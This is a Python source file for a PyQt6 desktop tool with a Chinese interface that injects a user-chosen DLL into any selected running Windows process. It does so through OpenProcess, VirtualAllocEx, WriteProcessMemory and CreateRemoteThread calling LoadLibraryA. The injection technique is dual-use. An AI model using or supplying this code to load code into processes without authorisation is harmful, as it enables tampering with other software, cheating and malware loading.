import sys
import ctypes
import os
import psutil
from PyQt6.QtWidgets import (QApplication, QWidget, QVBoxLayout, QPushButton, QLabel,
                             QFileDialog, QComboBox, QMessageBox, QHBoxLayout,
                             QGraphicsDropShadowEffect, QLineEdit, QSizePolicy, QListView)
from PyQt6.QtCore import Qt, QPoint, QSortFilterProxyModel, QStringListModel
from PyQt6.QtGui import (QPainter, QBrush, QColor, QFont, QPixmap, QIcon)


def inject_dll(pid, dll_path):
    try:
        PROCESS_ALL_ACCESS = 0x1F0FFF
        kernel32 = ctypes.windll.kernel32

        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process:
            return False, "无法打开进程"

        dll_path_bytes = dll_path.encode('utf-8')
        path_len = len(dll_path_bytes)

        alloc_mem = kernel32.VirtualAllocEx(h_process, 0, path_len, 0x3000, 0x40)
        if not alloc_mem:
            kernel32.CloseHandle(h_process)
            return False, "内存分配失败"

        written = ctypes.c_size_t()
        if not kernel32.WriteProcessMemory(h_process, alloc_mem, dll_path_bytes, path_len, ctypes.byref(written)):
            kernel32.CloseHandle(h_process)
            return False, "写入内存失败"

        kernel32_handle = kernel32.GetModuleHandleW("kernel32.dll")
        load_library_addr = kernel32.GetProcAddress(kernel32_handle, b"LoadLibraryA")

        thread = kernel32.CreateRemoteThread(h_process, None, 0, load_library_addr, alloc_mem, 0, None)
        if not thread:
            kernel32.CloseHandle(h_process)
            return False, "线程创建失败"

        kernel32.WaitForSingleObject(thread, 0xFFFFFFFF)

        # 获取线程退出代码
        exit_code = ctypes.c_ulong()
        kernel32.GetExitCodeThread(thread, ctypes.byref(exit_code))

        kernel32.VirtualFreeEx(h_process, alloc_mem, 0, 0x8000)
        kernel32.CloseHandle(thread)
        kernel32.CloseHandle(h_process)

        if exit_code.value == 0:
            return False, "DLL加载失败"

        return True, "DLL 注入成功"
    except Exception as e:
        return False, f"DLL 注入失败: {e}"


class ElegantInjector(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint)
        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        self.setWindowTitle("苍蝇头注入器 by TokyoRain")
        self.setWindowIcon(QIcon(self.get_resource_path("logo.ico")))
        self.old_pos = None
        self.process_model = QStringListModel()
        self.filter_proxy = QSortFilterProxyModel()
        self.init_ui()
        self.setFixedSize(400, 350)  # 固定窗口大小

    def get_resource_path(self, filename):
        base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
        return os.path.join(base_path, filename)

    def init_ui(self):
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(15, 15, 15, 15)
        self.setLayout(main_layout)

        title_bar = QHBoxLayout()
        title_bar.setContentsMargins(0, 0, 0, 10)

        title_layout = QHBoxLayout()
        self.logo = QLabel()
        logo_pixmap = QPixmap(self.get_resource_path("logo.png"))
        if not logo_pixmap.isNull():
            self.logo.setPixmap(logo_pixmap.scaled(32, 32, Qt.AspectRatioMode.KeepAspectRatio))
        self.logo.setAlignment(Qt.AlignmentFlag.AlignLeft)

        self.title_label = QLabel("苍蝇头注入器 v1.0")
        self.title_label.setStyleSheet("color: #6A89CC; font-weight: bold; font-size: 16px;")

        title_layout.addWidget(self.logo)
        title_layout.addWidget(self.title_label)
        title_layout.addStretch()

        self.exit_btn = QPushButton("×")
        self.exit_btn.setFixedSize(24, 24)
        self.exit_btn.setStyleSheet(
            "QPushButton {background-color: transparent; color: #999; font-size: 18px; font-weight: bold; border: none;}"
            "QPushButton:hover {color: #ff5555;}")
        self.exit_btn.clicked.connect(self.close)

        title_bar.addLayout(title_layout)
        title_bar.addWidget(self.exit_btn)
        main_layout.addLayout(title_bar)

        content_layout = QVBoxLayout()
        content_layout.setSpacing(10)

        search_layout = QHBoxLayout()
        self.search_edit = QLineEdit()
        self.search_edit.setPlaceholderText("搜索进程...")
        self.search_edit.setStyleSheet(
            "QLineEdit {background-color: #F5F5F5; border: 1px solid #DDD; border-radius: 4px; padding: 5px 10px;}")
        self.search_edit.textChanged.connect(self.filter_processes)
        search_layout.addWidget(self.search_edit)

        refresh_btn = QPushButton("↻")
        refresh_btn.setFixedSize(30, 30)
        refresh_btn.setToolTip("刷新进程列表")
        refresh_btn.setStyleSheet("QPushButton {background-color: #6A89CC; color: white; border-radius: 4px;}"
                                  "QPushButton:hover {background-color: #4A69BB;}")
        refresh_btn.clicked.connect(self.refresh_process_list)
        search_layout.addWidget(refresh_btn)
        content_layout.addLayout(search_layout)

        self.process_list = QComboBox()
        self.process_list.setStyleSheet(
            "QComboBox {background-color: #F5F5F5; border: 1px solid #DDD; border-radius: 4px; padding: 5px 10px; min-height: 30px;}"
            "QComboBox::drop-down {border: none;}")
        self.process_list.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Fixed)
        self.process_list.setView(QListView())
        self.process_list.setMaxVisibleItems(10)  # 限制可见项数量

        self.filter_proxy.setSourceModel(self.process_model)
        self.filter_proxy.setFilterCaseSensitivity(Qt.CaseSensitivity.CaseInsensitive)
        self.process_list.setModel(self.filter_proxy)

        self.refresh_process_list()
        content_layout.addWidget(self.process_list)

        self.file_btn = QPushButton("选择 DLL 文件")
        self.file_btn.setStyleSheet(
            "QPushButton {background-color: #6A89CC; color: white; border-radius: 4px; padding: 8px;}"
            "QPushButton:hover {background-color: #4A69BB;}")
        self.file_btn.clicked.connect(self.choose_file)
        content_layout.addWidget(self.file_btn)

        self.inject_btn = QPushButton("开始注入")
        self.inject_btn.setStyleSheet(
            "QPushButton {background-color: #38ADA9; color: white; border-radius: 4px; padding: 8px;}"
            "QPushButton:hover {background-color: #2D8D89;}"
            "QPushButton:disabled {background-color: #AAAAAA;}")
        self.inject_btn.clicked.connect(self.start_injection)
        content_layout.addWidget(self.inject_btn)

        self.status_label = QLabel("等待操作...")
        self.status_label.setStyleSheet("color: #6A89CC;")
        self.status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        content_layout.addWidget(self.status_label)

        main_layout.addLayout(content_layout)

        self.shadow = QGraphicsDropShadowEffect(self)
        self.shadow.setBlurRadius(15)
        self.shadow.setColor(QColor(0, 0, 0, 150))
        self.setGraphicsEffect(self.shadow)

        self.setFont(QFont("Microsoft YaHei", 9))
        self.file_path = ""

    def mousePressEvent(self, event):
        if event.button() == Qt.MouseButton.LeftButton:
            self.old_pos = event.globalPosition().toPoint()

    def mouseMoveEvent(self, event):
        if self.old_pos:
            delta = QPoint(event.globalPosition().toPoint() - self.old_pos)
            self.move(self.x() + delta.x(), self.y() + delta.y())
            self.old_pos = event.globalPosition().toPoint()

    def mouseReleaseEvent(self, event):
        if event.button() == Qt.MouseButton.LeftButton:
            self.old_pos = None

    def refresh_process_list(self):
        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                processes.append(f"{proc.info['name']} ({proc.info['pid']})")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        processes.sort(key=lambda x: x.lower())
        self.process_model.setStringList(processes)

    def filter_processes(self):
        self.filter_proxy.setFilterFixedString(self.search_edit.text())

    def choose_file(self):
        file, _ = QFileDialog.getOpenFileName(self, "选择 DLL", "", "DLL 文件 (*.dll)")
        if file:
            self.file_path = file
            self.status_label.setText(f"已选择: {os.path.basename(file)}")

    def start_injection(self):
        current_text = self.process_list.currentText()
        if not current_text:
            QMessageBox.warning(self, "错误", "请选择一个进程")
            return
        if not self.file_path:
            QMessageBox.warning(self, "错误", "请先选择 DLL 文件")
            return

        try:
            pid = int(current_text.split('(')[-1].rstrip(')'))
        except (IndexError, ValueError):
            QMessageBox.warning(self, "错误", "无法获取进程ID")
            return

        self.inject_btn.setEnabled(False)
        self.file_btn.setEnabled(False)
        QApplication.processEvents()  # 更新UI状态

        success, message = inject_dll(pid, self.file_path)

        self.inject_btn.setEnabled(True)
        self.file_btn.setEnabled(True)

        if success:
            self.status_label.setText("✔ DLL 注入成功!")
        else:
            self.status_label.setText("✖ 注入失败")
            QMessageBox.critical(self, "错误", message)

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)
        painter.setBrush(QBrush(QColor(240, 240, 240)))
        painter.setPen(Qt.PenStyle.NoPen)
        painter.drawRoundedRect(self.rect(), 10, 10)


if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    window = ElegantInjector()
    window.show()
    sys.exit(app.exec())